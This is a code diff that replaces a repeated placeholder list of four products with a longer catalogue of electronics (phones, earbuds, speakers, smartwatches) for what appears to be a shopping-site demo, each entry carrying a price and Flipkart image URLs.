-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/s/1/0/-original-imahggevkpgh5dkc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/i/z/y/-original-imahggevgnkffgfs.jpeg"
-                ]
-            },
-            {
-                id: 2,
-                name: "Samsung Galaxy S24 Ultra 5G (Titanium Gray)",
-                price: 109999,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/j/m/z/-original-imahgfmxumntk7sy.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/8/f/f/-original-imahgfmxq9f7sz6k.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/c/f/g/-original-imahgfmxnuhv2mxt.jpeg"
-                ]
-            },
-            {
-                id: 3,
-                name: "Sony WH-1000XM5 Wireless Headphones",
-                price: 24990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/612/612/xif0q/headphone/9/a/w/-original-imahe5gm9yszqgxc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/headphone/e/x/m/-original-imahe5gmey3y7hh6.jpeg"
-                ]
-            },
-            {
-                id: 4,
-                name: "Sony PlayStation 5 Console (Slim)",
-                price: 49990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/gaming-console/t/n/v/-original-imagzn7fvg8dt77s.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/gaming-console/4/q/e/-original-imagzn7fshgpygxz.jpeg"
-                 ]
-             },
-             {
-                id: 1,
-                name: "iPhone 16 Pro Max (Desert Titanium, 256GB)",
-                price: 134900,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/s/1/0/-original-imahggevkpgh5dkc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/i/z/y/-original-imahggevgnkffgfs.jpeg"
-                ]
-            },
-            {
-                id: 2,
-                name: "Samsung Galaxy S24 Ultra 5G (Titanium Gray)",
-                price: 109999,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/j/m/z/-original-imahgfmxumntk7sy.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/8/f/f/-original-imahgfmxq9f7sz6k.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/c/f/g/-original-imahgfmxnuhv2mxt.jpeg"
-                ]
-            },
-            {
-                id: 3,
-                name: "Sony WH-1000XM5 Wireless Headphones",
-                price: 24990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/612/612/xif0q/headphone/9/a/w/-original-imahe5gm9yszqgxc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/headphone/e/x/m/-original-imahe5gmey3y7hh6.jpeg"
-                ]
-            },
-            {
-                id: 4,
-                name: "Sony PlayStation 5 Console (Slim)",
-                price: 49990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/gaming-console/t/n/v/-original-imagzn7fvg8dt77s.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/gaming-console/4/q/e/-original-imagzn7fshgpygxz.jpeg"
-                   ]
-            },
-            {
-                id: 1,
-                name: "iPhone 16 Pro Max (Desert Titanium, 256GB)",
-                price: 134900,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/s/1/0/-original-imahggevkpgh5dkc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/i/z/y/-original-imahggevgnkffgfs.jpeg"
-                ]
-            },
-            {
-                id: 2,
-                name: "Samsung Galaxy S24 Ultra 5G (Titanium Gray)",
-                price: 109999,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/j/m/z/-original-imahgfmxumntk7sy.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/8/f/f/-original-imahgfmxq9f7sz6k.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/c/f/g/-original-imahgfmxnuhv2mxt.jpeg"
-                ]
-            },
-            {
-                id: 3,
-                name: "Sony WH-1000XM5 Wireless Headphones",
-                price: 24990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/612/612/xif0q/headphone/9/a/w/-original-imahe5gm9yszqgxc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/headphone/e/x/m/-original-imahe5gmey3y7hh6.jpeg"
-                ]
-            },
-            {
-                id: 4,
-                name: "Sony PlayStation 5 Console (Slim)",
-                price: 49990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/gaming-console/t/n/v/-original-imagzn7fvg8dt77s.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/gaming-console/4/q/e/-original-imagzn7fshgpygxz.jpeg"
-                 ]
-             },
-             {
-                id: 1,
-                name: "iPhone 16 Pro Max (Desert Titanium, 256GB)",
-                price: 134900,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/s/1/0/-original-imahggevkpgh5dkc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/i/z/y/-original-imahggevgnkffgfs.jpeg"
-                ]
-            },
-            {
-                id: 2,
-                name: "Samsung Galaxy S24 Ultra 5G (Titanium Gray)",
-                price: 109999,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/j/m/z/-original-imahgfmxumntk7sy.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/8/f/f/-original-imahgfmxq9f7sz6k.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/c/f/g/-original-imahgfmxnuhv2mxt.jpeg"
-                ]
-            },
-            {
-                id: 3,
-                name: "Sony WH-1000XM5 Wireless Headphones",
-                price: 24990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/612/612/xif0q/headphone/9/a/w/-original-imahe5gm9yszqgxc.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/headphone/e/x/m/-original-imahe5gmey3y7hh6.jpeg"
-                ]
-            },
-            {
-                id: 4,
-                name: "Sony PlayStation 5 Console (Slim)",
-                price: 49990,
-                images: [
-                    "https://rukminim2.flixcart.com/image/312/312/xif0q/gaming-console/t/n/v/-original-imagzn7fvg8dt77s.jpeg",
-                    "https://rukminim2.flixcart.com/image/128/128/xif0q/gaming-console/4/q/e/-original-imagzn7fshgpygxz.jpeg"
-                 ]
-            }
+            { id: 201, name: "Apple iPhone 16 Pro Max (Desert Titanium)", price: 1440, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/800/800/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg?q=70&crop=false", "https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/s/4/b/-original-imahggex8m6jhazj.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/i/z/y/-original-imahggevgnkffgfs.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/800/800/xif0q/mobile/s/q/r/-original-imahggessqugbgtn.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/u/i/p/-original-imahggexnszdzhgk.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/z/w/h/-original-imahgges92z2z3z4.jpeg?q=70&crop=false"] },
+            { id: 202, name: "Apple iPhone 15 Pro Max (Blue Titanium, 1 TB)", price: 1299, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/y/0/u/-original-imahggetzffhxaar.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/p/b/7/-original-imahggetywqjzwg6.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/100/xif0q/mobile/p/x/v/-original-imahgget2bnawe32.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/p/x/v/-original-imahgget2bnawe32.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/c/u/n/-original-imahggesm7x8cqpq.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/f/v/q/-original-imahggeszfhzzguy.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/o/d/u/-original-imahggeseyergyfm.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/3/3/m/-original-imahggespkyk86bh.jpeg?q=70&crop=false"] },
+            { id: 223, name: "OnePlus Nord Buds 2r True Wireless in Ear Earbuds with Dual Mic & AI Crystal Clear Call Bluetooth  (Triple Blue, True Wireless)", price: 199, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/v/y/i/-original-imagr4t8mwhmtyg9.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/f/h/b/-original-imagr4t8ej6we279.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/k/p/y/-original-imagr4t8jmt4zsra.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/6/l/q/-original-imagr4t8dwxfutht.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/6/l/q/-original-imagr4t8dwxfutht.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/6/l/q/-original-imagr4t8dwxfutht.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/w/u/v/-original-imagr4t8urgsxjkg.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/l/q/o/-original-imagr4t8fgj9afzc.jpeg?q=70&crop=false"] },
+            { id: 104, name: "OnePlus Bullets Wireless Z2 Bluetooth  (Beam Blue, In the Ear)", price: 149, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/u/x/g/bullets-wireless-z2-bluetooth-oneplus-original-imahdt5jpffgzebs.jpeg?q=70&crop=false", "https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/x/f/a/bullets-wireless-z2-bluetooth-oneplus-original-imahdt5jmgmaep2g.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/j/6/o/bullets-wireless-z2-bluetooth-oneplus-original-imahdt5jzg63bvjf.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/9/9/s/bullets-wireless-z2-bluetooth-oneplus-original-imahdt5jm36xjxve.jpeg?q=70&crop=false"] },
+            { id: 105, name: "realme Buds T310 with 12.4mm Driver, 46dB ANC, Spatial Audio and upto 40 hours Playback Bluetooth  (Agile White, True Wireless)", price: 199, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/p/6/n/buds-t310-realme-original-imahe6hbc29h58rk.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/128/128/xif0q/headphone/o/g/7/buds-t310-realme-original-imahe6hbu3xemben.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/128/128/xif0q/headphone/i/x/d/buds-t310-realme-original-imahe6hbvayjk2tw.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/128/128/xif0q/headphone/x/h/2/buds-t310-realme-original-imahe6hbpngn5gar.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/0/x/w/buds-t310-realme-original-imahe6hb9svrayr7.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/g/k/h/buds-t310-realme-original-imahe6hbgkewggzy.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/j/f/b/buds-t310-realme-original-imahe6hbnwact4j5.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/a/p/j/buds-t310-realme-original-imahe6hbypbhzvph.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/s/6/f/buds-t310-realme-original-imahe6hb3mzzng9d.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/o/a/m/buds-t310-realme-original-imahe6hbgejukg3u.jpeg?q=70&crop=false"] },
+            { id: 106, name: "boAt Nirvana Ion ANC Pro w/ Hi-Res Audio with LDAC, ANC, 120H Battery, Multi-Connect Bluetooth  (Crystal Black, True Wireless)", price: 199, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/l/a/a/-original-imahg837nzauzw5f.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/n/u/l/-original-imahg837urzrfjf7.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/a/g/i/-original-imahg837zhptgzqb.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/l/o/y/-original-imahg837myn7jbxy.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/e/f/p/-original-imahg837zbffurgx.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/t/o/x/-original-imahg8373yzsbmfm.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/t/o/x/-original-imahg8373yzsbmfm.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/o/b/w/-original-imahg837qr2xpvrf.jpeg?q=70&crop=false"] },
+            { id: 107, name: "Jlab JBuds LUX ANC Active Noise Cancelling, 70Hr Playtime, Multi Connect Bluetooth  (White, On the Ear)", price: 199, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/i/7/k/hbjluxancrwht62-jlab-original-imah4rhqwyhyytjh.jpeg?q=70&crop=false", "https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/l/w/8/hbjluxancrwht62-jlab-original-imah4rhqmnh974sp.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/g/5/h/hbjluxancrwht62-jlab-original-imah4rhqfeb8quuj.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/h/1/m/hbjluxancrwht62-jlab-original-imah4rhq3hdkdzv7.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/t/s/k/hbjluxancrwht62-jlab-original-imah4rhqykjjr9kf.jpeg?q=70&crop=false"] },
+            { id: 108, name: "OnePlus Bullets Wireless Z3 Bluetooth  (Crimson Eclipse, In the Ear)", price: 149, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/q/v/d/-original-imahhaxvqzcquf3x.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/u/o/h/-original-imahhaxvzru4jyfy.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/r/n/o/-original-imahhaxvtjajfs7y.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/w/a/h/-original-imahhaxvmhfqbast.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/e/e/c/-original-imahhaxvzhtczchz.jpeg?q=70&crop=false"] },
+            { id: 109, name: "GUGGU Monster (WIRELESS TOWER SPEAKER) Dynamic Thunder Sound With Karaoke MicG220 35 W Bluetooth Tower Speaker  (Black, 4.1 Channel)", price: 449, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/speaker/tower-speaker/g/s/q/monster-wireless-tower-speaker-dynamic-thunder-sound-with-original-imahgen2gxjzmkwm.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/speaker/party-speaker/o/n/b/monster-bluetooth-trolley-speaker-high-bass-sound-quality-with-original-imahdxxeywrxsxvq.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/speaker/party-speaker/v/x/c/monster-bluetooth-trolley-speaker-high-bass-sound-quality-with-original-imahdxxeubszd4fj.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/speaker/party-speaker/a/5/g/monster-bluetooth-trolley-speaker-high-bass-sound-quality-with-original-imahdxxekffgz3kh.jpeg?q=70&crop=false"] },
+            { id: 110, name: "GUGGU Rambo (BLUETOOTH TROLLEY SPEAKER) Deep Bass Sound With Wireless & Wired MicLB66 100 W Bluetooth Tower Speaker  (Multicolor, 4.1 Channel)", price: 399, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/speaker/tower-speaker/9/y/z/rambo-bluetooth-trolley-speaker-deep-bass-sound-with-wireless-original-imahhszzvpyyrfnc.jpeg?q=70&crop=false", "https://rukminim2.flixcart.com/image/1000/1000/xif0q/speaker/tower-speaker/g/m/n/rambo-bluetooth-trolley-speaker-deep-bass-sound-with-wireless-original-imahhszzwdgddjuv.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/speaker/tower-speaker/1/q/d/rambo-bluetooth-trolley-speaker-deep-bass-sound-with-wireless-original-imahhszzsbkamefn.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/speaker/tower-speaker/h/h/k/rambo-bluetooth-trolley-speaker-deep-bass-sound-with-wireless-original-imahhszzjfwqejra.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/speaker/tower-speaker/6/q/2/rambo-bluetooth-trolley-speaker-deep-bass-sound-with-wireless-original-imahhszzzaxkcekh.jpeg?q=70&crop=false"] },
+            { id: 111, name: "Noise Master Buds, 44 Hr Battery, Spatial Audio Bluetooth  (Titanium, True Wireless)", price: 299, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/k/8/h/-original-imahfbhyaagrpndv.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/k/f/b/-original-imahfbhyaykycpf2.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/q/x/t/-original-imahfbhyhbnyapuj.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/4/3/z/-original-imahfbhywdbpgna9.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/w/d/l/-original-imahc7jxuwgjvt7m.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/7/n/s/-original-imahc7jx4beyhjer.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/s/9/c/buds-sound-by-bose-in-ear-bluetooth-earbuds-44h-playtime-with-6-original-imahefpuq46xdwks.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/u/d/k/-original-imahfbhyftbshddz.jpeg?q=70&crop=false"] },
+            { id: 112, name: "OPPO Enco Buds3 Pro+ with ANC Bluetooth  (Sonic Blue, True Wireless)", price: 449, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/6/7/e/-original-imahhrndfrg6whzs.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/r/f/f/-original-imahhrndmgg3u6zy.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/k/o/q/-original-imahhrndktwhwnfa.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/p/y/v/-original-imahhst3dgtgtzch.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/q/y/z/-original-imahhst3m5hpddz9.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/c/p/h/-original-imahhrndezvugtpq.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/2/h/3/-original-imahhst3ueh9saxw.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/p/d/r/-original-imahhrndekfz5axg.jpeg?q=70&crop=false"] },
+            { id: 113, name: "OnePlus Nord Buds 3r TWS Earbud, 10min charge for 8hr Music, 3D Audio, 2-mic call Bluetooth  (Aura Blue, True Wireless)", price: 199, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/p/t/b/-original-imahf9daxb97keh5.jpeg?q=70&crop=false", "https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/u/q/2/-original-imahfsg7qtke8kpf.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/u/t/v/-original-imahfsg7g6g8sach.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/h/z/o/-original-imahf9dagcjdzyzx.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/q/l/u/-original-imahf9dapnacu7hh.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/n/1/q/-original-imahf9dayz6fy57z.jpeg?q=70&crop=false"] },
+            { id: 114, name: "Samsung Galaxy S24 Ultra 5G (Titanium Violet, 256 GB)  (12 GB RAM)", price: 799, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/w/r/z/-original-imahgfmysgtszenh.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/x/y/r/-original-imahgfmzpukjwyc8.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/n/e/y/-original-imahgfmzm7nzj3q8.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/o/i/d/-original-imahgfmzex8dk7jd.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/b/d/4/-original-imahgfmzqjha9z6h.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/u/b/i/-original-imahgfmzmr8wftep.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/t/g/5/-original-imahgfmzxgy8drvb.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/q/7/j/-original-imahgfmzg7cdan4h.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/i/g/0/-original-imahgfmzn5hagyeq.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/g/p/q/-original-imahgfmzzxtfgxyz.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/i/w/l/-original-imahgfmzp92d92dq.jpeg?q=70&crop=false"] },
+            { id: 115, name: "boAt Stone SpinX Pro with 8 HRS Playtime,RGB LEDs, TWS Mode, Signature Sound 20 W Bluetooth Speaker  (Midnight Black, Stereo Channel)", price: 399, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/speaker/1/g/b/-original-imagyjyehfhjgbyz.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/128/128/xif0q/speaker/0/7/n/-original-imah4ggqkhmyghgx.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/speaker/g/i/o/-original-imah4ggq8hyzyumc.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/speaker/s/9/s/-original-imah4ggqq8spajrk.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/speaker/n/a/1/-original-imah4ggqz6uhdkg2.jpeg?q=70&crop=false"] },
+            { id: 116, name: "Fire-Boltt Hurricane 33.02mm (1.3) Curved Glass Display with BT Calling, 100+ Sports Modes Smartwatch  (Grey Strap, Free Size)", price: 149, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/x/j/s/-original-imah4eddxhvzpxhc.jpeg?q=70&crop=false", "https://rukminim2.flixcart.com/image/128/128/xif0q/smartwatch/r/8/4/-original-imah6efgp9hjjcyf.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/i/v/y/-original-imah6efgvkk9vrtt.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/n/d/w/-original-imah4edddxppwyuj.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/z/7/o/-original-imah4eddqscqwgbh.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/b/j/l/-original-imah4edd5dwuqtxz.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/q/9/f/-original-imah6efgfmafzfhg.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/v/g/s/-original-imah4eddafvceug7.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/8/j/t/-original-imah4eddehsfxjye.jpeg?q=70&crop=false"] },
+            { id: 117, name: "GOBOULT Drift BT Calling HD Display, 140+ Watchface, BT calling, IP68 Smartwatch  (Sand Black Strap, Free Size)", price: 199, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/128/128/xif0q/smartwatch/g/n/5/-original-imaherxuggamz6zv.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/f/h/d/-original-imaherxuptxrhzen.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/128/128/xif0q/smartwatch/t/6/j/-original-imaherxuge2hwg2g.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/r/7/h/-original-imaherxuskv7gf3a.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/7/s/d/-original-imaherxue6ncj2mm.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/u/b/x/-original-imagnujerytmhbpe.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/q/8/f/-original-imaherxu2ehfwzgg.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/7/q/i/-original-imaherxuggjk4td6.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/p/p/r/-original-imaherxuvy38f9cg.jpeg?q=70&crop=false"] },
+            { id: 118, name: "Fire-Boltt Rise Bluetooth Calling 47mm (1.85), Metal Bod & Rotating Crown, 123 Sports Smartwatch  (Black Strap, Free Size)", price: 149, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/b/n/v/-original-imah82phwpdn7vgr.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/j/y/i/-original-imah6efg4agt7gam.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/b/i/i/-original-imah6efgctghbtbu.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/h/v/2/-original-imah6efgykhzhzad.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/j/j/3/-original-imah6efge37ezft4.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/g/g/h/-original-imah6efgfxsewkrg.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/r/y/i/-original-imahdyxrcegnn9ta.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/k/q/p/-original-imah6efgfgefxf7a.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/r/y/i/-original-imahdyxrcegnn9ta.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/4/h/o/-original-imah6efgmzvdrvxy.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/0/u/o/-original-imahdyxrtscf8zxq.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/g/g/h/-original-imah6efgfxsewkrg.jpeg?q=70&crop=false"] },
